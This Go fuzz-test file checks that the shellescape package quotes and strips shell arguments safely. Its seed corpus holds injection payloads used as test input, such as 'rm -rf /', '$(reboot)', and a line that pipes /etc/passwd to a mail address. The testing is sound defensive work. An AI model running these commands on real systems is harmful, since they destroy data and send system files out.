package shellescape_test

import (
	"bufio"
	"bytes"
	"strings"
	"testing"
	"unicode"
	"unicode/utf8"

	"github.com/google/shlex"

	"al.essio.dev/pkg/shellescape"
)

// safeRune reports whether r is a member of the unquoted-safe character set
// [\w@%+=:,./-] recognised by Quote. It is deliberately spelled out here rather
// than reusing the package's regexp so that a regression which loosens the
// pattern is caught instead of mirrored.
func safeRune(r rune) bool {
	switch {
	case r >= 'a' && r <= 'z',
		r >= 'A' && r <= 'Z',
		r >= '0' && r <= '9':
		return true
	}

	return strings.ContainsRune("_@%+=:,./-", r)
}

// seedCorpus is the shared set of adversarial payloads used to prime the
// string-oriented fuzz targets.
var seedCorpus = []string{
	"",
	"a",
	" ",
	"foo.example.com",
	"'",
	"''",
	"'''",
	`"`,
	`'\"'`,
	`''"'"''`,
	"don't say 'never'",
	"\\",
	"a\\b",
	"; rm -rf / ;",
	"foo && bar",
	"foo || bar",
	"cat /etc/passwd | mail bad@actor.com",
	"$(reboot)",
	"`id`",
	"`echo $(whoami)`",
	"$PATH",
	"${HOME}",
	"foo\nbar\tbaz",
	"* ? [a-z] {1..10}",
	"> /dev/null 2>&1",
	"<(ls -la)",
	"#comment",
	"~root",
	"!!",
	"--",
	"\x00",
	"a\x00b",
	"\x7f",
	"print\u0081ble",
	"\r\v\f",
	"こんにちは世界 🚀",
	"\xff",
	"a\xffb",
}

// FuzzQuote asserts the central security property of the package: for every
// input s, Quote(s) is a single shell token that a POSIX-compatible lexer
// expands back to exactly s, with no side effects and no word splitting.
func FuzzQuote(f *testing.F) {
	for _, s := range seedCorpus {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, s string) {
		got := shellescape.Quote(s)

		// A quoted token is never empty: an empty argument must survive as ''
		// rather than vanishing during word splitting.
		if got == "" {
			t.Fatalf("Quote(%q) = %q, want a non-empty token", s, got)
		}

		if got == s {
			// The unquoted fast path is only legitimate for a non-empty string
			// made up entirely of safe characters.
			if s == "" {
				t.Fatalf("Quote(%q) = %q, want %q", s, got, "''")
			}

			for _, r := range s {
				if !safeRune(r) {
					t.Fatalf("Quote(%q) returned the input unquoted, but it contains unsafe rune %q", s, r)
				}
			}

			return
		}

		// Everything else must be wrapped in single quotes.
		if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
			t.Fatalf("Quote(%q) = %q, want a single-quote wrapped token", s, got)
		}

		// shlex decodes its input as UTF-8 and replaces invalid bytes with
		// U+FFFD, so it cannot serve as an oracle for non-UTF-8 strings.
		if !utf8.ValidString(s) {
			return
		}

		tokens, err := shlex.Split(got)
		if err != nil {
			t.Fatalf("shlex.Split(%q) failed for input %q: %v", got, s, err)
		}

		if len(tokens) != 1 {
			t.Fatalf("shlex.Split(%q) = %q (%d tokens), want exactly 1 for input %q", got, tokens, len(tokens), s)
		}

		if tokens[0] != s {
			t.Fatalf("round-trip of %q through %q produced %q", s, got, tokens[0])
		}
	})
}

// FuzzQuoteCommand asserts that a quoted argument vector survives lexing with
// its arity and its element boundaries intact. The fuzz input is split on NUL
// to synthesise the argument slice.
func FuzzQuoteCommand(f *testing.F) {
	f.Add("ls\x00-l\x00file with space")
	f.Add("")
	f.Add("\x00")
	f.Add("echo\x00; rm -rf /")
	f.Add("echo\x00\x00")
	f.Add("a\x00'\x00$(id)\x00`whoami`")

	f.Fuzz(func(t *testing.T, joined string) {
		args := strings.Split(joined, "\x00")

		got := shellescape.QuoteCommand(args)

		for _, arg := range args {
			if !utf8.ValidString(arg) {
				return
			}
		}

		tokens, err := shlex.Split(got)
		if err != nil {
			t.Fatalf("shlex.Split(%q) failed for args %q: %v", got, args, err)
		}

		if len(tokens) != len(args) {
			t.Fatalf("shlex.Split(%q) = %q (%d tokens), want %d for args %q", got, tokens, len(tokens), len(args), args)
		}

		for i := range args {
			if tokens[i] != args[i] {
				t.Fatalf("arg %d round-tripped as %q, want %q (quoted: %q)", i, tokens[i], args[i], got)
			}
		}
	})
}

// FuzzStripUnsafe asserts that no non-printable rune survives the filter, that
// the result is a subsequence of the input, and that the filter is idempotent.
func FuzzStripUnsafe(f *testing.F) {
	for _, s := range seedCorpus {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, s string) {
		got := shellescape.StripUnsafe(s)

		for _, r := range got {
			if !unicode.IsPrint(r) {
				t.Fatalf("StripUnsafe(%q) = %q, which still contains non-printable rune %U", s, got, r)
			}
		}

		if !isSubsequence(got, s) {
			t.Fatalf("StripUnsafe(%q) = %q, which is not a subsequence of the input", s, got)
		}

		if again := shellescape.StripUnsafe(got); again != got {
			t.Fatalf("StripUnsafe is not idempotent: %q -> %q -> %q", s, got, again)
		}
	})
}

// FuzzStripSpaces asserts that no whitespace rune survives the filter, that the
// result is a subsequence of the input, and that the filter is idempotent.
func FuzzStripSpaces(f *testing.F) {
	for _, s := range seedCorpus {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, s string) {
		got := shellescape.StripSpaces(s)

		for _, r := range got {
			if unicode.IsSpace(r) {
				t.Fatalf("StripSpaces(%q) = %q, which still contains whitespace rune %U", s, got, r)
			}
		}

		if !isSubsequence(got, s) {
			t.Fatalf("StripSpaces(%q) = %q, which is not a subsequence of the input", s, got)
		}

		if again := shellescape.StripSpaces(got); again != got {
			t.Fatalf("StripSpaces is not idempotent: %q -> %q -> %q", s, got, again)
		}
	})
}

// FuzzScanTokens asserts that splitting a NUL-delimited stream neither loses
// nor invents data: the emitted tokens must be exactly the NUL-separated fields
// of the input, less the empty field implied by a trailing delimiter.
func FuzzScanTokens(f *testing.F) {
	f.Add([]byte("foo\x00bar\x00baz"))
	f.Add([]byte(""))
	f.Add([]byte("\x00"))
	f.Add([]byte("foo"))
	f.Add([]byte("foo\x00"))
	f.Add([]byte("\x00\x00\x00"))
	f.Add([]byte("foo\x00\x00bar"))
	f.Add([]byte("\xff\x00\xfe"))

	f.Fuzz(func(t *testing.T, data []byte) {
		want := strings.Split(string(data), "\x00")
		// A trailing delimiter terminates the final token rather than
		// introducing an empty one; the same rule collapses the empty input to
		// an empty token list.
		if want[len(want)-1] == "" {
			want = want[:len(want)-1]
		}

		scanner := bufio.NewScanner(bytes.NewReader(data))
		scanner.Split(shellescape.ScanTokens)
		scanner.Buffer(nil, len(data)+bufio.MaxScanTokenSize)

		var got []string

		for scanner.Scan() {
			got = append(got, scanner.Text())
		}

		if err := scanner.Err(); err != nil {
			t.Fatalf("scanner.Err() = %v for input %q", err, data)
		}

		if len(got) != len(want) {
			t.Fatalf("ScanTokens(%q) produced %q (%d tokens), want %q (%d tokens)", data, got, len(got), want, len(want))
		}

		for i := range want {
			if got[i] != want[i] {
				t.Fatalf("token %d of %q = %q, want %q", i, data, got[i], want[i])
			}
		}
	})
}

// isSubsequence reports whether sub can be obtained from s by deleting runes
// without reordering the remainder.
//
// The comparison is made over decoded runes rather than raw bytes because
// strings.Map, which backs both strip functions, re-encodes every invalid UTF-8
// byte as U+FFFD. That substitution can make the output longer than the input
// in bytes while still preserving the rune-level subsequence relation.
func isSubsequence(sub, s string) bool {
	subRunes, sRunes := []rune(sub), []rune(s)

	i := 0
	for _, r := range sRunes {
		if i < len(subRunes) && subRunes[i] == r {
			i++
		}
	}

	return i == len(subRunes)
}
